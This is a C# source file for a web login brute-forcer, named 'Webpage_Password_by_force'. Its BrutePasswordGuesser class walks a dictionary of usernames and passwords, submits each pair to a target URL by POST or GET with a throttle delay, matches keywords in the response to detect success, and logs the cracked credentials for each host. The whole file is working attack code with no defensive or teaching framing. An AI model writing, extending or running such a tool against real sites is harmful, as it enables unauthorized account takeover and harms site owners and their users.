using System;
using System.Linq;
using System.Threading;
using System.Windows;

namespace Webpage_Password_by_force
{
    class BruteData : EventArgs
    {
        public string Password = "";
        public string Username = "";
        public string ResponseBody = "";
    }
    class ResponseData : EventArgs
    {
        public string Data;
    }
    class BrutePasswordGuesser
    {
        private
        const bool _NOT_PAUSED = false;
        public Dictionary _Dictionary;
        public webMethod _webMethod;
        public httpMetaData fakeRequest;

        private volatile Boolean _KeepWorking;
        public Boolean isPause = false;

        public int totalProgress = 0;
        public int progress = 0, total = 0;
        public bool complete = false;
        public BruteData outResult = null;

        public int _dealy = 200;
        public int _timeout = 200000;
        public string key2;
        public string key1;
        public string REST;
        public string _info;
        public string _reqInfo = "";
        public string _successfulLogins;

        private int totalUsers = 0;
        private int totalPasswords = 0;
        private int currentPasswordNum = 0;
        public int currentUserNum = 0;
        private string currentUser = "";
        private string currentPassword = "";
        private int currentGuessNo = 0;

        DateTime startTime, endTime;

        public event EventHandler onData = null;
        public event EventHandler testCallback = null;
        public event EventHandler DataReceivedHandler = null;

        void msgBox(string text)
        {
            string messageBoxText = text;
            string caption = "?";
            MessageBoxButton button = MessageBoxButton.OK;
            MessageBoxImage icon = MessageBoxImage.Warning;
            MessageBoxResult result;

            result = MessageBox.Show(messageBoxText, caption, button, icon, MessageBoxResult.Yes);
        }
        void client_DataReceivedHandler(object sender, EventArgs e)
        {

            string responseBodyAsText = "body";
            if ( /*response.IsSuccessStatusCode &&*/ DataReceivedHandler != null)
            {
                DataReceivedHandler(this, e);
            }
            if (onData != null)
                onData(this, new ResponseData
                {
                    Data = responseBodyAsText
                });

        }
        public BrutePasswordGuesser(Dictionary Dic)
        {
            _Dictionary = Dic;
            _KeepWorking = true;
            isPause = _NOT_PAUSED;
            _webMethod = new webMethod();
            _webMethod.DataReceivedHandler += client_DataReceivedHandler;
            progress = 0;
            totalPasswords = _Dictionary.allPasswords.Length;
            totalUsers = _Dictionary.allUsers.Length;
            total = totalPasswords * totalUsers;
        }

        public int getTotalProgress()
        {
            double num3 = (double)progress / (double)total;
            num3 *= 100;
            return (int)num3;
        }
        private void onComplete()
        {
            _KeepWorking = false;
            complete = true;
        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            random = new Random();
            //const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public void nextGuess()
        {
            while (_KeepWorking)
            {
                if (isPause == _NOT_PAUSED)
                {
                    if (++currentGuessNo == 1) { }
                    startTime = DateTime.Now;
                    if (_dealy > 0) Thread.Sleep(_dealy);
                    progress += 1;
                    currentPassword = _Dictionary.allPasswords[currentPasswordNum];
                    currentUser = _Dictionary.allUsers[currentUserNum];

                    fakeRequest.AUTH_PASSWORD = currentPassword;
                    fakeRequest.AUTH_USERNAME = currentUser;
                    fakeRequest.timeout = _timeout;

                    if (testCallback != null)
                    {
                        testCallback(this, new BruteData
                        {
                            Password = currentPassword,
                            Username = currentUser
                        });
                    }

                    string responseBodyAsText = "";
                    bool result = false;
                    if (fakeRequest.postMethod == "POST")
                    {
                        result = _webMethod.post(fakeRequest, fakeRequest.myCookieContainer, ref responseBodyAsText, ref _reqInfo, REST);
                    }
                    else if (fakeRequest.postMethod == "GET")
                    {
                        result = _webMethod.get(fakeRequest, fakeRequest.myCookieContainer, ref responseBodyAsText, ref _reqInfo);
                    }

                    if ( /*response.IsSuccessStatusCode &&*/ DataReceivedHandler != null)
                    {
                        DataReceivedHandler(this, new ResponseData
                        {
                            Data = responseBodyAsText
                        });
                    }

                    bool matched = true;
                    if (key1 != null && key1.Length > 0 && matched == true)
                    {
                        matched = responseBodyAsText.Contains(key1) == true;
                    }
                    if (key2 != null && key2.Length > 0 && matched == true)
                    {
                        matched = responseBodyAsText.Contains(key2) == false;
                    }

                    endTime = DateTime.Now;
                    _info += currentGuessNo + ". "+ fakeRequest.postMethod+ " " + fakeRequest.targetURL.Host + " => ";
                    Double elapsedMillisecs = ((TimeSpan)(endTime - startTime)).TotalMilliseconds;
                    if (matched)
                    {
                        // msgBox(_reqInfo);
                        _successfulLogins += fakeRequest.targetURL.Host + " => " + currentUser + ":" + currentPassword + "\n";
                        _info += " Login Sucessful " + currentUser + ":" + currentPassword;
                    }
                    else
                    {
                        _info += " Login Failed " + currentUser + ":" + currentPassword;
                    }
                    _info += " Time for => " + elapsedMillisecs + "ms\n";

                    currentPasswordNum++;
                    if (currentPasswordNum >= totalPasswords)
                    {
                        currentPasswordNum = 0;
                        currentUserNum++;
                        if (currentUserNum >= totalUsers)
                        {
                            currentUserNum = 0;
                            onComplete();
                        }
                    }

                }
                else
                {
                    if (_dealy > 0) Thread.Sleep(_dealy + 1000);
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }

            }
        }
        public void stopGuessing()
        {
            _KeepWorking = false;
        }
    }
}